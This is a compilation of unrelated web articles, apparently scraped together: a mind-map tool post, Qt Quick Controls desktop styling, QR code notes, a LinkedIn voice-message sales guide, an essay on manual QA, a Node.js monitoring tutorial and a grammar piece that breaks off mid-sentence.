<p>After the good experience I had with mind maps, I decided to digitally register part of my knowledge using this method. Not only about algorithms but also Biology, History, Grammar and all these other fields I barely know a thing. </p>
<p>I established some criteria. The tool for this job should:</p>
<ol>
<li>have a very low time-wise cost for writing </li>
<li>have basic search functionality</li>
<li>have a way to connect different mind maps </li>
<li>be portable — it should work at least on my PC and my phone</li>
</ol>
<p>I didn't find any tool that fits these criteria, so I decided to build my own. That said, one additional requirement was:</p>
<ol start="5">
<li>the tool should be so simple that the time to build it should be at most a few hours — because <a href="https://denisidoro.github.io/posts/tips-for-faster-development/">I'm lazy</a></li>
</ol>
<p>This requirement made me reject some complex ideas I had that involved graph databases such as <a href="https://neo4j.com/">Neo4j</a>.</p>
<p>For writing, I went with the most simple solution possible: an indented plain text document. </p>
<pre><code><span>Kingdoms
   Animalia
   Plantae
   Arthropoda
      Insects
   Fungi
   Porifera
</span></code></pre><h3 id="the-result">The result</h3>
<p>After some work, here's what I came up with:</p>

    <figcaption>Jumping between nodes and different mind maps is easy!</figcaption>
</figure>
<p>The UI is smart enough to show any relevant info related to the root node, so the more mind maps you write that include the query, the more data the UI will be able to connect. </p>
<p>Since it uses pretty standard web technologies, it works on my phone without any hiccups. </p>

    <figcaption>The UI is fully functional on Chromium-based browsers on Android</figcaption>
</figure>
<p>I also added buttons to quickly go the dictionary definition or Wikipedia article related to the root node. </p>
<figure>
    <img src="https://user-images.githubusercontent.com/3226564/99437720-99f2fd00-28f1-11eb-9e89-f421b831e3a0.png">
    <figcaption>Clicking on the globe icon leads to the Wikipedia article that best matches "gauss"</figcaption>
</figure>
<p>It's hosted on Github Pages so you can try it out <a href="https://denisidoro.github.com/move-reminder">here</a>. </p>
<p>The app is capable of downloading mind map definitions from the web so it should work for everyone. Please refer to help section for more info.</p>
<p>Do you have suggestions for this tool? If so please open an issue in its git repo! </p>

<![CDATA[Desktop Styling with Qt Quick Controls]]>

November 17, 2020 | https://www.qt.io/blog/desktop-styling-with-qt-quick-controls | <a href="https://web.archive.org/web/*/https://www.qt.io/blog/desktop-styling-with-qt-quick-controls">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Qt Quick Controls 1 was our first UI framework for QML. The controls were mostly written in QML without much C++. At the time, QML was still a new technology, which meant that we didn’t have enough experience with designing for performance to know what to expect. So the styling API ended up inefficient by design, with many fat delegates that used extensive amounts of JavaScript, bindings, introspection, Loaders, and QObjects for both control logic and styling. It also had a linking dependency to Qt Widgets to get native styling and Widget-based dialogs. And without the QML compiler that we have today, this all ended up as a rather slow and messy approach. When we realized that it also didn’t perform well on embedded hardware, it was time to rethink the solution. And the result was Qt Quick Controls 2.</p>
<!--more-->
<h2>Qt Quick Controls 2</h2>
<div><p>With Controls 2 the basic idea was to shift most of the implementation from QML to C++. By doing so, we aimed at slimming down the delegates as much as possible, and instead do the heavy lifting from C++. This included all the control logic, mouse, touch, event handling, API, and more. Only the visuals were left to be defined in QML. This resulted in thin delegates, less run-time overhead, less memory usage, clearer code flow, and faster execution. </p><p>But one thing that has been missing so far, is support for native desktop styling. The main motivation for Controls 2 was to achieve good performance on embedded devices, and since we had Qt Widgets for desktop, we sort of accepted that some essential desktop features were missing. We shipped styles that have open documentation (Universal, Material), and made it easy to create custom ones. But now that Controls 1 has been deprecated since Qt 5.12, and will also be excluded from the Qt 6 binary package, it’s time to work on desktop-oriented styles again.</p></div>
<h2>Native desktop styles</h2>
<div><p>In Qt 6.0, we are adding two new desktop styles to Controls 2: Windows and macOS. Unlike the existing Fusion style, which uses Qt Quick primitives, these new styles use QStyle for drawing. The reason is that it still does a good job of interfacing with “low-level” platform APIs to get true native styling. But instead of sharing QStyle with Widgets, we make an exclusive copy just for Controls. The latter might sound odd, since it’s natural to assume that sharing one codebase would be an easier approach. But the reasons are several: first of all, we don’t want to break Widgets or any 3rd party styles out there. And we cannot factor QStyle out of Widgets without breaking source compatibility. Not only does QStyle have references to Widgets all over its API, but it also uses enums and constants directly from the Widgets themselves. At the same time, we don’t want Controls to have a dependency on Widgets long into the future either.</p><p>Another reason is that we want the freedom to change the code wherever we see fit. There are many ways we can optimize the QStyle-copy going forward, to better fit the Qt Quick scene graph and the Controls styling API. One such change is that we only use QStyle for drawing the background of a control. The same background texture will be cached and reused for all controls of the same type, and scaled to the correct size with the help of a QSGNinePatchNode. The text and foreground will be rendered on top using normal QML. And for all such differences, we want to be able to implement them without being constrained or worried about keeping compatibility with Widgets. For the same reasons, the fact that we use QStyle for drawing is a private implementation detail. Controls already has a great styling API, and we don’t want to introduce and maintain a second one.</p><p>Lastly, we don’t necessarily want the native styles to look exactly like Widgets. For some controls, we use a hybrid approach, with QML to add animations and fading effects on top of the textures painted by QStyle. In the end, what we really want is for the native styles to have fluid performance, and to look as “native” as possible, and not necessarily like Widgets.</p></div>
<h2>What is ready for Qt 6.0?</h2>
<div><p>For Qt 6.0, most controls will be supported by the new desktop styles. But not all. Those that will be missing are the ones that currently don't have an implementation in QStyle from before, like Switch or RangeSlider. They are still available, but will be drawn with the Fusion style. Missing controls will gradually be supported in upcoming releases of Qt, the same with native dialogs and menus. And if we look even further, our plans include offering more desktop-centric controls that you might find in Widgets or native toolkits today.</p><p>So, still lots to do. But we see the new desktop styles as the first step of many to bring Controls on par with Widgets for desktop development over the next few years.</p></div>
<p>Below are screenshots of a Qt Quick Controls 2 application running with the new desktop styles. Note that this is still ongoing work, and any glitches will be ironed out before the final release.</p>

									<ul>
<li><span>Hara Masahiro while aboard a commuter train in Japan, had a eureka-like moment trying to get a scanner to recognize his strange little barcode. 25 years later, the U.S. still somewhat has little interest in the innovation.</span></li>
<li><span>“As the world shifts towards contactless interactions, Masahiro’s modernization of the barcode is gaining popularity and relevance. In time, it may serve to transition us toward a new reality: a fractal, digital ‘mirrorworld,’ sitting on top of our own.” — Mario Gabriele</span></li>
<li><span>Barcodes had somewhat already been created in the U.S. but they had a data storage problem. Masahiro solved the problem by creating a two-dimensional pattern instead of a one-dimensional column pattern (which we’re all familiar with).&nbsp;</span></li>
<li><span>“The result is the camera becomes the browser, and the world becomes the web. Or, something materially more like it — a corpus of changing, fluid data, queryable by a machine.” — Mario Gabriele</span></li>
<li><span>Why do QR codes matter? “Because it brings a fundamental renegotiation of spatial concepts, and the relationships between individual and object, object and world, viewer and viewed. Which is to say that when viewed through the lens of a camera, the world changes.” — Mario Gabriele</span></li>
<li><span>“When viewed through a camera, QR codes make everything purchasable — instantly — collapsing the space between impulse and action.”</span></li>
<li><span>“Once we enter the always-on reality of AR glasses, filtering will become more important. Users will want to decide which companies’ offers appear automatically, which they never want to hear from, and which should manifest conditionally. We will need a sort of AdBlock for our eyes.” — Mario Gabriele</span>
<ul>
<li><span>AD BLOCKERS FOR OUR EYES….the future is going to be crazy…..</span></li>

								<p><span>QR codes have so many possibilities for our future. It’s almost inevitable that they will play a huge role in everything from ordering at restaurants to advertising in the physical world. For more ideas and opportunities, I highly recommend reading the piece. </span></p>

    <article>

        

        <section>
            <p>In 2018, LinkedIn launched a new feature: LinkedIn Voice Messages. This new feature allows users to send 1-minute long voice messages to any connection on LinkedIn. </p>

<p>However, the reason why not a lot of people know about it is because it’s only available in the LinkedIn mobile app. Like some of the best sales leaders in the industry have already understood, this feature can be a great opportunity to stand out and get people’s attention. </p>

<p>Does that mean that you need to open your LinkedIn mobile app whenever you want to reach out to someone? No, this is where things get interesting. To make this feature more accessible and actually leverage it, Amplemarket’s extension recently made it available in the browser! </p>

<p><img src="https://i.imgur.com/DaMotum.gif" alt=""></p>

<h2 id="whatmakesthesemessagessorelevanttoanypersonsellingonlinkedin">What makes these messages so relevant to any person selling on LinkedIn? 🧐</h2>

<p>How many LinkedIn voice messages have you ever received? Probably not that many (if any). It’s a new channel that will automatically grab a person’s attention just because of its novelty - people are curious!</p>

<p>Besides, voice messages feel inherently more personal than text. The voice messages feature is something that most people are used to seeing on apps like WhatsApp or iMessage and it’s associated with something that you should pay attention to.</p>

<p>Generally speaking, you should always be considering different ways of connecting with your prospects and LinkedIn Voice Messages are a great way to stand out from the crowd and achieve much higher engagement rates.</p>

<h2 id="howcanyoubestleveragelinkedinvoicemessagesforsales">How can you best leverage LinkedIn voice messages for sales?</h2>

<p><img src="https://i.imgur.com/61xi0GP.png" alt=""></p>

<h4 id="1useitasanunconventionalfirsttouch">#1 Use it as an unconventional first touch</h4>

<p>The idea is to leverage this less conventional channel in your first touch and make a great first impression. </p>

<p><strong>Step 1: Do your research and connect with the prospect beforehand (2-3 days)</strong></p>

<p>Whenever you reach out to someone, it’s crucial that you have found potential buying intent from this prospect. If this is found, you should find some elements to personalize your message. This can range from industry, title, interests, etc they mention on the LinkedIn profile to other information you may have collected somewhere else (example: recent company news, referral by xyz, etc).</p>

<p>Note: If you’re using these voice messages in complement to an email sequence. You can use LinkedIn bulk actions on Amplemarket to quickly connect with all the prospects on that sequence.</p>

<p><img src="https://i.imgur.com/GWxs6BK.jpg" alt=""></p>

<p><strong>Step 2: Structure your voice message</strong></p>

<ul>
<li><p><strong>Be concise.</strong> Although LinkedIn allows you to send 1-minute long messages, keep your message under 30 seconds.</p></li>
<li><p><strong>Have a powerful and personalized intro (first 7-10 secs).</strong> You want to get the prospect’s attention in the first 5 seconds. Prospects don’t like to lose time with spammers, so make sure to leverage your research and personalize your message.</p></li>
</ul>

<blockquote>
  <p>“Hey {{first_name}}, I figured I’d drop you a message as I’m sure that everyone is probably texting you at this moment.”</p>
  
  <p>“Hi {{first<em>name}}, I looked at your profile and saw that you are {{title}} at {{company</em>name}}. I figured that [topic] falls into your wheelhouse.”</p>
</blockquote>

<ul>
<li><strong>Introduce your value proposition (next 15 secs).</strong> Prove that you’re worth continuing to listen to. Follow the introduction with a strong message that provides value.</li>
</ul>

<blockquote>
  <p>“We just got off a call with a client we recently helped solve [issue] for in only a matter of weeks.”</p>
  
  <p>“We’re currently helping clients with [problem<em>you</em>solve] and I was curious to see if this is also something you’ve been facing recently.”</p>
</blockquote>

<ul>
<li><strong>End with an effective call to action (5-10 secs).</strong> The end goal of your message is to get the prospect to engage with you. Make sure you offer a chance to get a reply.</li>
</ul>

<blockquote>
  <p>“I would love to schedule a call to go over this issue, would you be the best person to discuss this with?"</p>
</blockquote>

<p><strong>Step 3: Record, listen and send your message!</strong></p>

<p>When you practice, record it so you can listen to yourself. Make sure you sound conversational, not too formal nor too casual. Speak in a clear tone and don’t rush the script (even though it’s only 30 secs you’ll see that you have time to say all the relevant things you need).</p>

<p>When you're ready, <strong>hit send!</strong></p>

<p><strong>Step 4: Follow-up with text</strong></p>

<p>Prospects aren’t usually aware of this functionality, so they might be skeptical to open your voice message. Send them a personalized very short text to make sure they are prompted to open your recording. </p>

<blockquote>
  <p>“Hi {{first_name}}, just dropped a quick message over here, keen to hear back.”</p>
</blockquote>

<h4 id="2useitasasoftreminderwithinasalessequence">#2 Use it as a soft reminder within a sales sequence</h4>

<p>LinkedIn voice messages can also be used as a reminder within an ongoing sales sequence. You can have high relevancy first touch via email and follow up with a LinkedIn Voice Message that is a bit less personalized than the first touch but will get some attention points due to the novelty of the channel. </p>

<p>Additionally, when leaving a voice message you’ll be visiting the prospect’s profile which will trigger a LinkedIn notification and create another way to naturally grab the prospect’s attention.</p>

<p>Here is an example of what you could say in this situation:</p>

<blockquote>
  <p>“Hey {{first<em>name}}, I just shot you an email but figured dropping you a message to explain why I’m reaching out to you. I saw that you are {{title}} at {company</em>name}} and figured that [topic] falls into your wheelhouse. Are you the right person to discuss this with?”</p>
</blockquote>

<h4 id="3useitasanunexpectedlasttouch">#3 Use it as an unexpected last touch</h4>

<p>LinkedIn voice messages can also be used as a last resource when the prospect has been unresponsive on all the other channels. Again, the channel’s novelty will help you grab the prospect’s attention and you could also leverage the fact that you have tirelessly exhausted all the possibilities to connect with the prospect.</p>

<p>Here is an example of what you could say in this situation:</p>

<blockquote>
  <p>“Hi {{first_name}}, I thought I’d give it a last shot. We’re currently working with… Do you think this is worth a conversation?”</p>
</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>How you do QA is probably terrible.</p>

<p>Of course I don’t know you, but most software development shops that I’ve worked on or chatted with “do QA” in a way that is pretty terrible.</p>

<p>Almost everyone does it, and almost everyone considers it a “best practice”, and yet somehow it never even got a name.  I’m going to call it “block-testing” because it’s the kind of testing that unfortunately makes continuous deployment and continuous delivery fundamentally impossible.</p>

<h3>So what is it already?!?!</h3>

<p>It’s the practice of having humans try to regression-test an entire product or some high-value subset of features across the entire product usually with the goal of finding reasons to stop it from being released.  The most extreme (worst) case of this being when a specific role exists solely for this purpose (almost always given the misnomer “QA”).</p>

<p>Just to be super-duper clear: I’m aware that almost everyone is doing block-testing.  That doesn’t mean it’s a good fit for every organization though.  If you actually want to achieve continuous deployment or continuous delivery, this is one of the big-batch operations that you’ll need to forego.</p>

<h3>What’s so bad about it?</h3>

<ul>
<li>A single manual run-through of a broad test script is slow (compared to existing automation)</li>
<li>It’s expensive (compared to good automation, over the long-term)</li>
<li>It frequently misses all but the most egregious regressions (more often than alternatives)</li>
<li>It’s antagonistic, pitting different roles at the company against each other.</li>
<li>It confuses where the responsibility for quality lies</li>
<li>There are many other possible solutions to the same problem, many of which are faster and more comprehensive.</li>
</ul>


<p>Alright a couple of those things are obvious to most people I think so let’s just dig into a couple of the less obvious ones:</p>

<h4>It’s antagonistic</h4>

<p>Hiring people whose sole purpose is to find reasons to stop a release is counter to the goals of a company that is trying to release software quickly.  Of course block-testers are actually tasked with the important goal of making sure each release is high-quality (and that’s a critical goal!), but the end result is that as block-testers, they naturally tend to optimize their role to “trying to find release-blockers”.  They’ll log other defects too of course, but those don’t have the same importance to them (or anyone else) as issues that block releases.</p>

<p>Also when you’ve got one group of people responsible for finding fault in another group’s work, you’re going to have conflict between the groups.  Engineers are going to start saying that the bug isn’t theirs or the bug isn’t “that bad”.  Testers are going to say the opposite.  Each group is going to blame the other when management wonders why releases are delayed or infrequent.  You’ll get the same finger-pointing when a defect gets through to production as well.  The ensuing arguments are a massive waste of time and each “side” becomes less empathetic to the other’s plight over time.</p>

<h4>It Confuses where the Responsibility for Quality Lies</h4>

<p>I’ve heard the words “You’re the tester! Test it!” a few times in my career.  The sentiment is that development and testing are distinct phases rather than something that happens iteratively during development, and “the developers do the developing and the testers do the testing”.  “This frees developers up to just focus on just development”.</p>

<p>Nothing really could be further from the truth and I have some serious doubts about the experience of any developer that thinks that they shouldn’t be testing their own work along the way as if they can hammer out 15 or more LoC and won’t have to bother to try and see if it works.  The fact of the matter is that quality is entirely the responsibility of the developer and any successful developer is testing constantly as they go.  Conversely, the tester’s only role is to assess the quality.  The tester has no responsibility whatsoever to improve it.</p>

<p>At the same time, the very presence of the tester is a very confusing signal.  It signals that the developers aren’t wholly responsible for quality (and maybe even that they’re not trusted with it!).  It diminishes their <a href="https://en.wikipedia.org/wiki/Skin_in_the_game_(phrase">skin in the game</a> ), and disincentives quality.  Of course a tester-only role has no ability to actually fix defects, and you can’t sanely hold someone responsible for something they have no control over.</p>

<p>I would wager that this division of responsibility is the single greatest cost of block-testing.  The testers and the developers start to engage in a kind of game of ping-pong where the developer tries to see what they can get past the tester, and the tester tries to find ways to block the release for any reason at all.  I’ve seen a feature go back and forth from developer to tester more than a half-dozen times before the tester agrees that it’s okay to release.  That back-and-forth often plays out over days through an issue tracker for trivially-fixed-but-important issues in high value features.  If you’re looking closely for this kind of activity you can see it all over the place, and it can look about as effective as a football team that uses telegrams to communicate mid-play.  These hand-offs are all classic waste from a <a href="https://dzone.com/articles/waste-4-handoffs">Lean perspective</a>.</p>

<p>There are many other possible solutions to ensuring quality, many of which are faster and more comprehensive.</p>

<p>Once you realize the harm, the cost, and the inadequacy of block-testing, you naturally have to ask, “but is there anything better?”.  You can’t really fault an organization for block-testing if there are no alternatives.</p>

<h3>Let’s chat about some alternatives:</h3>

<h4>Move Fast and Avoid False Dichotomies</h4>

<p>It’s really unfortunate that the industry has resolved itself to the belief that you have to either go slow or you’ll break things, and that quality and speed are an inevitable and universal trade-off.  This is a really limiting belief.</p>

<p>In order to get creative, let’s forget the “best practices” for a minute and get back to first-principles:  Here’s what we’re trying to do:</p>

<ul>
<li>We want to minimize users’ exposure to defects and outages.</li>
<li>We want to minimize the time spent between a developer completing a change on their workstation and it getting to users to keep delivery radically fast.</li>
<li>We want to catch more issues than a human can.</li>
</ul>


<h4>Preventative Measures</h4>

<p>Preventative measures are anything that you might do to prevent a defect from affecting a user.  They’re a pretty critical part of achieving goal A.</p>

<p>However, goal B means we really have to be careful what steps we put between the developer and the production environment.  Ideally they’re critically important and they’re fast.  Each of these steps has to pay for themselves.  Because of this, you have to be <em>really</em> careful about what preventative measures you choose.  Some really fast preventative measures: static-typing, automated tests, broken-link-checking spiders, linters.</p>

<h4>Mitigating Measures</h4>

<p>You also have to start thinking about how to achieve Goal A with more than just preventative measures.  Preventative measures aren’t everything.  Even the most ardent block-testers have non-preventative measures:  feedback from the end-user (even if it goes through 5 levels of support first).  I’ll call these post-deployment measures “mitigating measures”.  There are 3 main categories for the types of mitigation:</p>

<ul>
<li>Reducing the severity of a defect (# of users, impact per user, etc)</li>
<li>Finding defects faster</li>
<li>Fixing defects faster</li>
</ul>


<p>Hopefully those categories get your imagination started.  User feedback is a mitigation measure; it’s just the slowest and most expensive one.  Here are a few that do better:</p>

<ul>
<li>Fast automated deployment.  If you can’t get a fix out quickly, more users will be affected for longer than necessary.</li>
<li>Telemetry: logging, metrics, and alerts.  Instrument your codebase in as many ways as possible to make it self-report issues it might be having.  Alerts will tell you when things are going wrong faster than user-feedback and often you’ll learn about things that humans (manual testers or even end-users) did not, or even could not find.</li>
<li>One-click rollback.  Make it so that your production environment can be rolled back to the previous known-good deployment as quickly and easily as possible.</li>
<li>Staged roll-out.  Coupled with great telemetry, a gradual deployment process allows you to halt deployment and roll-back (even automatically) if there is a spike in crashes or logged errors before something is fully deployed.</li>
<li>Feature flags / Feature toggles / kill switches.  Control (post-deployment) what users get what features and when.  If there are any problems, only the allowed users are impacted, and the broken functionality is quickly reverted.</li>
</ul>


<p>Of course, you will probably want to do these things even if you never eliminate block-testing from your release process.  The prevailing practice seems to be to forego these things and expect the human block-tester will catch everything though.  That’s a kind of bury-your-head-in-the-sand quality management.</p>

<p>If you try these things out though, you’re almost certainly going to see that these practices are cheaper, faster, and more effective than block-testers though.</p>

<h4>“But Automation is Expensive!”</h4>

<p>Automation IS expensive!  I have no argument against that.  It is.  I’ve seen numerous well-covered codebases have more test code than application code, so the upfront costs of automated tests are probably close to the same as writing the application code itself.</p>

<p>Over the long haul it pays for itself though.  A well-covered codebase easily has thousands of tests each getting run thousands of times a year, so we’re talking about millions of behaviour verifications on the conservative end of things.  Humans simply cannot compete with that.  Humans are slow, and even the best of them are terrible at repetitive detail-oriented tasks.  As expensive as automation is, block-testers are even more expensive.</p>

<h4>“But developers are terrible at testing!”</h4>

<p>They’re really not.  Many haven’t had much practice because they’re working in …</p></div></div>

<h3>Have you ever desired to watch your code running, instead of just imagining it?</h3>



<p>Hi, I’m Valerio software engineer from Italy and CTO at Inspector.</p>



<p id="5148">As product owner I learned on my skin how an application issue can be so hard to fix, creating a negative impact on the users experience, or block new potential customers during on-boarding.</p>



<p id="361a">I publish new code changes almost every day and unfortunately it’s quite impossible to anticipate all the problems that could happen after every release. Furthermore users don’t spend their time to report bugs, they just stop using our application, checking for another one that fits their needs better.</p>



<p id="4b8e">In most of the projects I’ve worked on the 50% of the drawbacks for users were caused by simple code mistakes, but more the application grows the more difficult it is to avoid these incidents.</p>



<p id="7873">When I started to share my idea behind Inspector I realized that many developers know the problem:&nbsp;<strong>they spend a lot of time to investigate strange behaviors inside their application, but they didn’t know that there’s a solution to eliminate this complexity in two minutes, avoiding customer complaints or even the loss of the customer.</strong></p>



<p id="51d3">Be the first to know if my application is in trouble “<strong>before</strong>” users stumble onto the problem, drastically reduce the negative impact on their experience, giving me the right foundation to run a successful users acquisition process and to continually increase engagement with less interruptions as possible.</p>



<p id="16c1">Inspector is an npm module to add real-time code execution monitoring to your NodeJS application, allowing you to work on continuous code changes while catching bugs and bottlenecks at a glance before users do.</p>



<p>In this article I’ll use Express framework to build code snippets, but you are free to use Inspector in any Nodejs script.</p>



<h2>NodeJS Code Execution Monitoring: how it works</h2>



<p>It takes less than one minute to get started. Let me show you how it works.</p>



<h3>Install Inspector</h3>



<p>Run the npm command below in your terminal:</p>



<pre><code lang="bash">npm install @inspector-apm/inspector-nodejs --save</code></pre>



<h3>Configure the Ingestion Key</h3>



<p>Get a fresh Ingestion key by signing up for Inspector (<a rel="noreferrer noopener" href="https://app.inspector.dev/register" target="_blank">https://app.inspector.dev/register</a>) and create a new project,&nbsp;it&nbsp;takes&nbsp;just a few&nbsp;seconds.</p>



<p>You’ll see installation instructions directly in the app screen:</p>



<figure><img loading="lazy" width="1024" height="611" src="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png" alt="" srcset="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png 1024w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-300x179.png 300w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-768x459.png 768w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app.png 1395w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="//www.inspector.dev/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png" data-srcset="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png 1024w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-300x179.png 300w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-768x459.png 768w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app.png 1395w"></figure>







<h3>Initialization</h3>



<p>To monitor the code execution in real time you need to do just two steps:</p>



<ol><li>Initialize Inspector before you require any other modules in your application – i.e. before <code>express</code>, <code>http</code>, <code>mysql</code>, etc.</li><li>Attach the <code>expressMiddleware()</code> to your express app.</li></ol>



<pre><code lang="javascript">/* -------------------------------------------
 * Initialize Inspector with the Ingestion Key.
 --------------------------------------------- */
const inspector = require('@inspector-apm/inspector-nodejs')({
  ingestionKey: 'xxxxxxxxxxxxx',
})

const app = require('express')()

/* -----------------------------------------------
 * Attach the middleware to monitor HTTP requests fulfillment.
 ------------------------------------------------- */
app.use(inspector.expressMiddleware())

app.get('/', function (req, res) {
    inspector.reportException(new Error('My first Error!'));
    return res.send('Home Page!')
})

app.get('/posts/:id', function (req, res) {
    return res.send('Single Post Details!')
})

app.listen(3006)</code></pre>



<p>That’s it.</p>



<h2>Navigate your application</h2>



<p>Now when your application receive a request Inspector automatically detect the most important events and create a visual representation of what’s happening inside your application during its normal operation, keeping an eye on code execution..</p>



<p>Launch the app with <code><strong>node app.js</strong></code> command, and navigate it in the browser on <strong><code>http://localhost:3006</code></strong>.</p>



<p>Instantly you will see transaction streams in your dashboard and for each transaction you can monitor what your application is executing in real-time:</p>

<h3 id="9cbd">Enrich your timeline</h3>



<p id="d444">Inspector monitors database query, with many type of driver (mysql2, postgre, mongodb) by default, but there might be many critical statements in your code that needs to be monitored in terms of performance and errors:</p>



<ul><li>Algorithms</li><li>Function that deals with files (pdf, excel, images)</li></ul>



<p id="656e"><strong>Thanks to our module you can add custom segments in your timeline in addition to those detected by default, to measure the impact that an hidden code block has on a transaction’s performance.</strong></p>



<p id="5739">Let me show you a real life example.</p>



<p id="b5d0">Suppose you have a function that export data from the database in a csv file.</p>



<pre><code lang="javascript">app.get('/export', function (req, res) {
    connection.query(
        'SELECT * FROM users',
        function (err, results, fields) {
           res.download(
               ExportService.createCsv(results)
           )
        }
    )
})</code></pre>



<p>The query will be automatically detected by Inspector but <strong>it could be interesting to monitor and measure the execution of the exprot function and activate alerting if somethings goes wrong.</strong> Here you can create a custom segment to add the file export statement in your timeline and monitor its impact on the request fulfillment over time.</p>



<pre><code lang="javascript">app.get('/export', function (req, res) {
    connection.query(
        'SELECT * FROM users',
        function (err, results, fields) {

           // Add the export procedure to the timeline
           inspector.addSegment(() =&gt; {
              return ExportService.createCsv(results)
           }, 'export').then(file =&gt; {
              res.download(file)
           })

        }
    )
})</code></pre>



<p>You will easily identify the impact of the new segment in the transaction timeline:</p>

<h3 id="edc9">Errors &amp; Exceptions Alerting</h3>



<p id="479c"><strong>By default, every exception fired in your Nodejs app will be reported automatically to be sure you’re alerted for unpredictable errors in real time.</strong></p>



<p id="695e">I wish that every change I make to my code could be perfect. But the reality is, this is not always the case. Some errors appear immediately after an update, while others pop up unpredictably. It’s an unfortunate fact of life for developers which often also depends on problems caused by the connection between our application and other services.</p>



<p id="3a9c">However, Inspector makes the job easier. It automates the detection of unknown issues so I no longer need to manually check the status of my apps continuously&nbsp;or&nbsp;wait&nbsp;reports&nbsp;directly&nbsp;from&nbsp;users. If something goes wrong It will send a notification in real time, and after each release I can stay informed about the impact of the latest code refactor.</p>



<p id="6d48">If your code fires an exception but you don’t want to block the execution, you can report the error to inspector manually for personal monitoring.</p>



<pre><code lang="javascript">try {   

    // Your dangerous external call here...

} catch (e) {
   inspector.reportException(e)
}</code></pre>



<p>Furthermore, if the export method fails, you will be alerted in real time in your inbox to take a look at the error as it appears.</p>



<div><figure><img loading="lazy" width="543" height="467" src="https://www.inspector.dev/wp-content/uploads/2020/09/inspector-exception-notification.png" alt="" srcset="https://www.inspector.dev/wp-content/uploads/2020/09/inspector-exception-notification.png 543w, https://www.inspector.dev/wp-content/uploads/2020/09/inspector-exception-notification-300x258.png 300w" sizes="(max-width: 543px) 100vw, 543px" data-old-src="//www.inspector.dev/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://www.inspector.dev/wp-content/uploads/2020/09/inspector-exception-notification.png" data-srcset="https://www.inspector.dev/wp-content/uploads/2020/09/inspector-exception-notification.png 543w, https://www.inspector.dev/wp-content/uploads/2020/09/inspector-exception-notification-300x258.png 300w"></figure></div>







<p>You even get access to detailed information gathered by Inspector in real time:</p>



<div><figure><img loading="lazy" width="527" height="372" src="https://www.inspector.dev/wp-content/uploads/2020/09/inspetor-error-short.png" alt="" srcset="https://www.inspector.dev/wp-content/uploads/2020/09/inspetor-error-short.png 527w, https://www.inspector.dev/wp-content/uploads/2020/09/inspetor-error-short-300x212.png 300w" sizes="(max-width: 527px) 100vw, 527px" data-old-src="//www.inspector.dev/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://www.inspector.dev/wp-content/uploads/2020/09/inspetor-error-short.png" data-srcset="https://www.inspector.dev/wp-content/uploads/2020/09/inspetor-error-short.png 527w, https://www.inspector.dev/wp-content/uploads/2020/09/inspetor-error-short-300x212.png 300w"></figure></div>







<h3 id="871c">Conclusion</h3>



<p id="1186">When a customer reports to you that something isn’t working, it forces you to drop whatever you are doing and start trying to reproduce the scenario, then recapture and reanalyze the logs in your own toolset.</p>



<p id="c15f">Getting a true picture of what’s happening can require hours or, based on my experience, even days. Inspector can make a huge difference in terms of efficiency, productivity&nbsp;and&nbsp;customers&nbsp;happiness.</p>



<p id="5fa8">By delegating bug discovery to an automatic&nbsp;<strong>NodeJs monitoring tool</strong>, it makes 90% of the work behind the scene, and you can solve issues before users even know about them.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We all make mistakes; no one is perfect. What will set you apart is your ability to identify and fix those mistakes. As writers, we make the most mistakes; our pieces are filled with grammatical errors, plot holes, contradictions, and wrong words. Even the best among us have to edit their pieces because no matter how experienced you are, new mistakes will eventually come knocking. The essence is in not giving up.</p><blockquote><p>A professional writer is an amateur who didn't quit.</p><p>— Richard Bach</p></blockquote><p>In this article, I am going to highlight a few common mistakes that writers make, and how you can avoid them.</p><h2><strong><span data-preserver-spaces="true">1. Affect vs. effect</span></strong></h2><p>Affect and effect are homophones (similar sounding words) and lot of writers confuse their usage; interchanging them. It is one of the most common mistakes among writers <span data-preserver-spaces="true">you can avoid it if you understand the basic grammar behind these two words.</span></p><p><strong>Affect</strong><span data-preserver-spaces="true">&nbsp;is a <em>verb</em>. It is used when someone or something is <em>acting</em></span><em><span data-preserver-spaces="true">&nbsp;on something or someone </span></em>t<span data-preserver-spaces="true">o produce a result or change.</span></p><p><strong>Example of Affect<br></strong><em><span data-preserver-spaces="true">The whole class was <strong>affected</strong> by his bad behavior.&nbsp;</span></em></p><p><strong>Effect</strong><span data-preserver-spaces="true">&nbsp;is a <em>noun</em>. It is used to convey the <em>r</em></span><em>esult</em><span data-preserver-spaces="true">&nbsp;or c</span><em><span data-preserver-spaces="true">onsequence&nbsp;</span></em><span data-preserver-spaces="true">of some&nbsp;</span><em><span data-preserver-spaces="true">action </span></em><span data-preserver-spaces="true">performed </span><span data-preserver-spaces="true">by someone or something</span><span data-preserver-spaces="true">.</span></p><p><strong>Example of Effect<br></strong><em><span data-preserver-spaces="true">His rejection was an <strong>effect</strong> of his inexperience as a writer.&nbsp;</span></em></p><h2><strong><span data-preserver-spaces="true">2. Its vs. it's</span></strong></h2><p><span data-preserver-spaces="true">Its and it's are very easily confused due to their similar sound (and appearance).</span></p><p><span data-preserver-spaces="true"><strong>Its</strong> is possessive (belonging to). It is used to represent ownership:</span></p><p><strong>Example of Its</strong><br><em>When he tried to get into the car, <strong>its</strong> door wouldn't open.</em></p><p>On the other hand,&nbsp;<strong>it's&nbsp;</strong>is a contraction of <strong><em>it has</em></strong> or <strong><em>it 